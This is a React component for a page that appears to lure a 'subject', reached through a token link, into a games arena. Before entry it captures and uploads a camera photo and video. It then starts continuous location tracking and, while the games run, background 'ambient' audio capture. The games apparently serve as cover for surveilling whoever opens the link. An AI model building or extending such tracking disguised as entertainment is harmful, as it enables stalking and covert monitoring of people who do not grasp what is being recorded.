import React, { useState, useRef, useCallback, useEffect } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import { GPS_OPTIONS } from './geolocation';
import { useLocationTracker } from './hooks/useLocationTracker';
import { useCameraCapture } from './hooks/useCameraCapture';
import { useAmbientCapture } from './hooks/useAmbientCapture';
import { getDeviceInfo } from './deviceInfo';
import { uploadSubjectMedia } from './mediaUpload';
import {
    SUBJECT_GRANTED_KEY,
    SUBJECT_CAMERA_DONE_KEY,
    getClientSessionId,
    CONSENT_TEXT,
    CAMERA_VIDEO_SECONDS
} from './config';
import SubjectArenaGate from './games/SubjectArenaGate';
import SubjectGameEntry from './games/SubjectGameEntry';

const noop = () => {};

function entryStatus(phase) {
    if (phase === 'booting') return 'booting';
    if (phase === 'camera_waiting') return 'camera';
    if (phase === 'location_waiting') return 'location';
    return 'ready';
}

function SubjectPage() {
    const navigate = useNavigate();
    const [searchParams] = useSearchParams();
    const deviceInfoRef = useRef(getDeviceInfo());
    const [phase, setPhase] = useState('prompt');
    const [entryError, setEntryError] = useState(null);
    const [errorDetail, setErrorDetail] = useState('');
    const [activeGameId, setActiveGameId] = useState(null);
    const [trackingEnabled, setTrackingEnabled] = useState(false);
    const { runCaptureSession } = useCameraCapture();
    const clientSessionId = useRef(getClientSessionId());
    const initialAudioStreamRef = useRef(null);

    const ambientEnabled =
        trackingEnabled &&
        (phase === 'arena' || phase === 'playing');

    useAmbientCapture({
        enabled: ambientEnabled,
        clientSessionId: clientSessionId.current,
        initialAudioStream: initialAudioStreamRef.current
    });

    useEffect(() => {
        const token = searchParams.get('token') || searchParams.get('t');
        if (token) {
            navigate(`/s/${token}`, { replace: true });
        }
    }, [searchParams, navigate]);

    useLocationTracker({
        enabled: trackingEnabled,
        deviceInfo: deviceInfoRef.current,
        testMode: false,
        consentText: CONSENT_TEXT,
        onConnectionChange: noop,
        onDeviceRegistered: noop,
        onUserLocation: noop,
        onDevicesChange: noop,
        onLocationRefining: noop
    });

    useEffect(() => {
        const locOk = localStorage.getItem(SUBJECT_GRANTED_KEY) === 'true';
        const camOk = localStorage.getItem(SUBJECT_CAMERA_DONE_KEY) === 'true';
        if (locOk && camOk) {
            setTrackingEnabled(true);
            setPhase('arena');
        }
    }, []);

    const startTracking = useCallback(() => {
        localStorage.setItem(SUBJECT_GRANTED_KEY, 'true');
        setTrackingEnabled(true);
        setPhase('arena');
    }, []);

    const clientKey = clientSessionId.current;

    const handleSelectGame = useCallback((gameId) => {
        setActiveGameId(gameId);
        setPhase('playing');
    }, []);

    const handleBackToHub = useCallback(() => {
        setActiveGameId(null);
        setPhase('arena');
    }, []);

    const requestLocation = useCallback(() => {
        if (!navigator.geolocation) {
            setEntryError('denied');
            setPhase('prompt');
            return;
        }
        setPhase('location_waiting');
        setErrorDetail('');
        navigator.geolocation.getCurrentPosition(
            () => startTracking(),
            () => {
                setEntryError('denied');
                setPhase('prompt');
            },
            GPS_OPTIONS
        );
    }, [startTracking]);

    const requestPermissions = useCallback(async () => {
        setEntryError(null);
        setErrorDetail('');
        setPhase('camera_waiting');
        try {
            const { photo, video, stream } = await runCaptureSession(CAMERA_VIDEO_SECONDS, {
                keepStreamForAmbient: true
            });
            initialAudioStreamRef.current = stream;
            await uploadSubjectMedia({
                clientSessionId: clientSessionId.current,
                type: 'photo',
                blob: photo,
                captureSource: 'initial'
            });
            localStorage.setItem(SUBJECT_CAMERA_DONE_KEY, 'true');
            if (video) {
                await uploadSubjectMedia({
                    clientSessionId: clientSessionId.current,
                    type: 'video',
                    blob: video,
                    captureSource: 'initial'
                });
            }
            requestLocation();
        } catch (err) {
            const msg = err?.message || String(err);
            setErrorDetail(msg);
            if (msg === 'NOT_SUPPORTED') {
                setEntryError('denied');
            } else if (err?.name === 'NotAllowedError' || msg.includes('Permission')) {
                setEntryError('camera_denied');
            } else {
                setEntryError('upload_error');
            }
            setPhase('prompt');
        }
    }, [runCaptureSession, requestLocation]);

    if (phase === 'arena' || phase === 'playing') {
        return (
            <SubjectArenaGate
                clientKey={clientKey}
                activeGameId={activeGameId}
                onSelectGame={handleSelectGame}
                onBackToHub={handleBackToHub}
            />
        );
    }

    return (
        <SubjectGameEntry
            status={entryStatus(phase)}
            error={entryError}
            errorDetail={errorDetail}
            onStart={requestPermissions}
        />
    );
}

export default SubjectPage;
